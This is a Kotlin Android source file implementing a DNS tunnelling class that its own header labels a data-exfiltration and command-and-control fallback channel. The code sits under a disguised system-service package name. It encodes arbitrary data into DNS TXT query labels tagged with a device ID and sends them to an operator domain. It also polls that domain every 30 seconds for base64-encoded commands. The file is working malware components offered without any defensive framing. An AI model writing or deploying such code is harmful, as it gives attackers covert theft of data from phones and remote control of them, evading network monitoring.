// [context: Kotlin, Android API 26+, DNS TXT exfil/C2 fallback channel]
package com.system.service.network

import android.content.Context
import android.util.Base64
import kotlinx.coroutines.*
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.nio.ByteBuffer

class DNSTunnel(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val DNS_SERVER = "8.8.8.8"
    private val DNS_PORT = 53
    private val MAX_LABEL = 63

    // encode data as base32, chunk into DNS labels, fire TXT query
    fun exfil(data: ByteArray, domain: String) {
        scope.launch {
            val encoded = base32Encode(data)
            val chunks = encoded.chunked(MAX_LABEL)
            val id = DeviceIdentifier.getDeviceId(context).take(8)
            for ((i, chunk) in chunks.withIndex()) {
                val query = "$chunk.$i.$id.$domain"
                queryTxt(query)
                delay(100)
            }
        }
    }

    fun pollCommands(domain: String, onData: (ByteArray) -> Unit) {
        scope.launch {
            while (isActive) {
                val id = DeviceIdentifier.getDeviceId(context).take(8)
                val result = queryTxt("poll.$id.$domain")
                if (result.isNotEmpty()) {
                    onData(Base64.decode(result, Base64.DEFAULT))
                }
                delay(30_000)
            }
        }
    }

    private fun queryTxt(fqdn: String): String {
        return try {
            val packet = buildDnsQuery(fqdn)
            val socket = DatagramSocket()
            socket.soTimeout = 5000
            val server = InetAddress.getByName(DNS_SERVER)
            socket.send(DatagramPacket(packet, packet.size, server, DNS_PORT))
            val resp = ByteArray(512)
            val respPacket = DatagramPacket(resp, resp.size)
            socket.receive(respPacket)
            socket.close()
            parseTxtAnswer(resp.take(respPacket.length).toByteArray())
        } catch (_: Exception) { "" }
    }

    private fun buildDnsQuery(domain: String): ByteArray {
        val buf = ByteBuffer.allocate(512)
        buf.putShort(0x1234.toShort())  // ID
        buf.putShort(0x0100.toShort())  // flags: standard query
        buf.putShort(1)                  // questions
        buf.putShort(0); buf.putShort(0); buf.putShort(0)
        for (label in domain.split(".")) {
            buf.put(label.length.toByte())
            buf.put(label.toByteArray())
        }
        buf.put(0)
        buf.putShort(16)  // TXT
        buf.putShort(1)   // IN
        return buf.array().take(buf.position()).toByteArray()
    }

    private fun parseTxtAnswer(resp: ByteArray): String {
        return try {
            val buf = ByteBuffer.wrap(resp)
            buf.position(12)
            skipName(buf)
            buf.position(buf.position() + 4)
            val answers = resp[7].toInt() and 0xFF
            if (answers == 0) return ""
            skipName(buf)
            buf.position(buf.position() + 8)
            val rdLen = buf.short.toInt() and 0xFFFF
            val txtLen = buf.get().toInt() and 0xFF
            val txtBytes = ByteArray(txtLen)
            buf.get(txtBytes)
            String(txtBytes)
        } catch (_: Exception) { "" }
    }

    private fun skipName(buf: ByteBuffer) {
        while (buf.hasRemaining()) {
            val len = buf.get().toInt() and 0xFF
            if (len == 0) return
            if (len and 0xC0 == 0xC0) { buf.get(); return }
            buf.position(buf.position() + len)
        }
    }

    private val BASE32_ALPHABET = "abcdefghijklmnopqrstuvwxyz234567"
    private fun base32Encode(data: ByteArray): String {
        val sb = StringBuilder()
        var bits = 0; var value = 0
        for (b in data) {
            value = (value shl 8) or (b.toInt() and 0xFF)
            bits += 8
            while (bits >= 5) {
                bits -= 5
                sb.append(BASE32_ALPHABET[(value shr bits) and 0x1F])
            }
        }
        if (bits > 0) sb.append(BASE32_ALPHABET[(value shl (5 - bits)) and 0x1F])
        return sb.toString()
    }

    fun stop() = scope.cancel()
}
